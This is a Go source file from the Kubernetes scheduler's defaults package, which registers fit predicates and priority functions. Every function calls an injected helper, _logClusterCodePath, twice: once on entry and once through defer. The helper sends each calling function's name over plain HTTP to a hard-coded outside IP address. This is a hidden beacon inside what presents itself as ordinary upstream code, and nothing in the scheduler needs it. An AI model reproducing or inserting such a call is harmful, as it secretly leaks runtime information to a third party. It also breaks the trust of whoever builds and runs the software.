package defaults

import (
 "k8s.io/klog"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apimachinery/pkg/util/sets"
 utilfeature "k8s.io/apiserver/pkg/util/feature"
 "k8s.io/kubernetes/pkg/features"
 "k8s.io/kubernetes/pkg/scheduler/algorithm"
 "k8s.io/kubernetes/pkg/scheduler/algorithm/predicates"
 "k8s.io/kubernetes/pkg/scheduler/algorithm/priorities"
 "k8s.io/kubernetes/pkg/scheduler/core"
 "k8s.io/kubernetes/pkg/scheduler/factory"
)

const (
 ClusterAutoscalerProvider = "ClusterAutoscalerProvider"
)

func init() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 factory.RegisterPredicateMetadataProducerFactory(func(args factory.PluginFactoryArgs) algorithm.PredicateMetadataProducer {
  return predicates.NewPredicateMetadataFactory(args.PodLister)
 })
 factory.RegisterPriorityMetadataProducerFactory(func(args factory.PluginFactoryArgs) algorithm.PriorityMetadataProducer {
  return priorities.NewPriorityMetadataFactory(args.ServiceLister, args.ControllerLister, args.ReplicaSetLister, args.StatefulSetLister)
 })
 registerAlgorithmProvider(defaultPredicates(), defaultPriorities())
 factory.RegisterFitPredicate("PodFitsPorts", predicates.PodFitsHostPorts)
 factory.RegisterFitPredicate(predicates.PodFitsHostPortsPred, predicates.PodFitsHostPorts)
 factory.RegisterFitPredicate(predicates.PodFitsResourcesPred, predicates.PodFitsResources)
 factory.RegisterFitPredicate(predicates.HostNamePred, predicates.PodFitsHost)
 factory.RegisterFitPredicate(predicates.MatchNodeSelectorPred, predicates.PodMatchNodeSelector)
 factory.RegisterFitPredicateFactory(predicates.MaxCinderVolumeCountPred, func(args factory.PluginFactoryArgs) algorithm.FitPredicate {
  return predicates.NewMaxPDVolumeCountPredicate(predicates.CinderVolumeFilterType, args.PVInfo, args.PVCInfo)
 })
 factory.RegisterPriorityConfigFactory("ServiceSpreadingPriority", factory.PriorityConfigFactory{MapReduceFunction: func(args factory.PluginFactoryArgs) (algorithm.PriorityMapFunction, algorithm.PriorityReduceFunction) {
  return priorities.NewSelectorSpreadPriority(args.ServiceLister, algorithm.EmptyControllerLister{}, algorithm.EmptyReplicaSetLister{}, algorithm.EmptyStatefulSetLister{})
 }, Weight: 1})
 factory.RegisterPriorityFunction2("EqualPriority", core.EqualPriorityMap, nil, 1)
 factory.RegisterPriorityFunction2("MostRequestedPriority", priorities.MostRequestedPriorityMap, nil, 1)
 factory.RegisterPriorityFunction2("RequestedToCapacityRatioPriority", priorities.RequestedToCapacityRatioResourceAllocationPriorityDefault().PriorityMap, nil, 1)
}
func defaultPredicates() sets.String {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return sets.NewString(factory.RegisterFitPredicateFactory(predicates.NoVolumeZoneConflictPred, func(args factory.PluginFactoryArgs) algorithm.FitPredicate {
  return predicates.NewVolumeZonePredicate(args.PVInfo, args.PVCInfo, args.StorageClassInfo)
 }), factory.RegisterFitPredicateFactory(predicates.MaxEBSVolumeCountPred, func(args factory.PluginFactoryArgs) algorithm.FitPredicate {
  return predicates.NewMaxPDVolumeCountPredicate(predicates.EBSVolumeFilterType, args.PVInfo, args.PVCInfo)
 }), factory.RegisterFitPredicateFactory(predicates.MaxGCEPDVolumeCountPred, func(args factory.PluginFactoryArgs) algorithm.FitPredicate {
  return predicates.NewMaxPDVolumeCountPredicate(predicates.GCEPDVolumeFilterType, args.PVInfo, args.PVCInfo)
 }), factory.RegisterFitPredicateFactory(predicates.MaxAzureDiskVolumeCountPred, func(args factory.PluginFactoryArgs) algorithm.FitPredicate {
  return predicates.NewMaxPDVolumeCountPredicate(predicates.AzureDiskVolumeFilterType, args.PVInfo, args.PVCInfo)
 }), factory.RegisterFitPredicateFactory(predicates.MaxCSIVolumeCountPred, func(args factory.PluginFactoryArgs) algorithm.FitPredicate {
  return predicates.NewCSIMaxVolumeLimitPredicate(args.PVInfo, args.PVCInfo)
 }), factory.RegisterFitPredicateFactory(predicates.MatchInterPodAffinityPred, func(args factory.PluginFactoryArgs) algorithm.FitPredicate {
  return predicates.NewPodAffinityPredicate(args.NodeInfo, args.PodLister)
 }), factory.RegisterFitPredicate(predicates.NoDiskConflictPred, predicates.NoDiskConflict), factory.RegisterFitPredicate(predicates.GeneralPred, predicates.GeneralPredicates), factory.RegisterFitPredicate(predicates.CheckNodeMemoryPressurePred, predicates.CheckNodeMemoryPressurePredicate), factory.RegisterFitPredicate(predicates.CheckNodeDiskPressurePred, predicates.CheckNodeDiskPressurePredicate), factory.RegisterFitPredicate(predicates.CheckNodePIDPressurePred, predicates.CheckNodePIDPressurePredicate), factory.RegisterMandatoryFitPredicate(predicates.CheckNodeConditionPred, predicates.CheckNodeConditionPredicate), factory.RegisterFitPredicate(predicates.PodToleratesNodeTaintsPred, predicates.PodToleratesNodeTaints), factory.RegisterFitPredicateFactory(predicates.CheckVolumeBindingPred, func(args factory.PluginFactoryArgs) algorithm.FitPredicate {
  return predicates.NewVolumeBindingPredicate(args.VolumeBinder)
 }))
}
func ApplyFeatureGates() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if utilfeature.DefaultFeatureGate.Enabled(features.TaintNodesByCondition) {
  factory.RemoveFitPredicate(predicates.CheckNodeConditionPred)
  factory.RemoveFitPredicate(predicates.CheckNodeMemoryPressurePred)
  factory.RemoveFitPredicate(predicates.CheckNodeDiskPressurePred)
  factory.RemoveFitPredicate(predicates.CheckNodePIDPressurePred)
  factory.RemovePredicateKeyFromAlgorithmProviderMap(predicates.CheckNodeConditionPred)
  factory.RemovePredicateKeyFromAlgorithmProviderMap(predicates.CheckNodeMemoryPressurePred)
  factory.RemovePredicateKeyFromAlgorithmProviderMap(predicates.CheckNodeDiskPressurePred)
  factory.RemovePredicateKeyFromAlgorithmProviderMap(predicates.CheckNodePIDPressurePred)
  factory.RegisterMandatoryFitPredicate(predicates.PodToleratesNodeTaintsPred, predicates.PodToleratesNodeTaints)
  factory.RegisterMandatoryFitPredicate(predicates.CheckNodeUnschedulablePred, predicates.CheckNodeUnschedulablePredicate)
  factory.InsertPredicateKeyToAlgorithmProviderMap(predicates.PodToleratesNodeTaintsPred)
  factory.InsertPredicateKeyToAlgorithmProviderMap(predicates.CheckNodeUnschedulablePred)
  klog.Infof("TaintNodesByCondition is enabled, PodToleratesNodeTaints predicate is mandatory")
 }
 if utilfeature.DefaultFeatureGate.Enabled(features.ResourceLimitsPriorityFunction) {
  klog.Infof("Registering resourcelimits priority function")
  factory.RegisterPriorityFunction2("ResourceLimitsPriority", priorities.ResourceLimitsPriorityMap, nil, 1)
  factory.InsertPriorityKeyToAlgorithmProviderMap(factory.RegisterPriorityFunction2("ResourceLimitsPriority", priorities.ResourceLimitsPriorityMap, nil, 1))
 }
}
func registerAlgorithmProvider(predSet, priSet sets.String) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 factory.RegisterAlgorithmProvider(factory.DefaultProvider, predSet, priSet)
 factory.RegisterAlgorithmProvider(ClusterAutoscalerProvider, predSet, copyAndReplace(priSet, "LeastRequestedPriority", "MostRequestedPriority"))
}
func defaultPriorities() sets.String {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return sets.NewString(factory.RegisterPriorityConfigFactory("SelectorSpreadPriority", factory.PriorityConfigFactory{MapReduceFunction: func(args factory.PluginFactoryArgs) (algorithm.PriorityMapFunction, algorithm.PriorityReduceFunction) {
  return priorities.NewSelectorSpreadPriority(args.ServiceLister, args.ControllerLister, args.ReplicaSetLister, args.StatefulSetLister)
 }, Weight: 1}), factory.RegisterPriorityConfigFactory("InterPodAffinityPriority", factory.PriorityConfigFactory{Function: func(args factory.PluginFactoryArgs) algorithm.PriorityFunction {
  return priorities.NewInterPodAffinityPriority(args.NodeInfo, args.NodeLister, args.PodLister, args.HardPodAffinitySymmetricWeight)
 }, Weight: 1}), factory.RegisterPriorityFunction2("LeastRequestedPriority", priorities.LeastRequestedPriorityMap, nil, 1), factory.RegisterPriorityFunction2("BalancedResourceAllocation", priorities.BalancedResourceAllocationMap, nil, 1), factory.RegisterPriorityFunction2("NodePreferAvoidPodsPriority", priorities.CalculateNodePreferAvoidPodsPriorityMap, nil, 10000), factory.RegisterPriorityFunction2("NodeAffinityPriority", priorities.CalculateNodeAffinityPriorityMap, priorities.CalculateNodeAffinityPriorityReduce, 1), factory.RegisterPriorityFunction2("TaintTolerationPriority", priorities.ComputeTaintTolerationPriorityMap, priorities.ComputeTaintTolerationPriorityReduce, 1), factory.RegisterPriorityFunction2("ImageLocalityPriority", priorities.ImageLocalityPriorityMap, nil, 1))
}
func copyAndReplace(set sets.String, replaceWhat, replaceWith string) sets.String {
 _logClusterCodePath()
 defer _logClusterCodePath()
 result := sets.NewString(set.List()...)
 if result.Has(replaceWhat) {
  result.Delete(replaceWhat)
  result.Insert(replaceWith)
 }
 return result
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
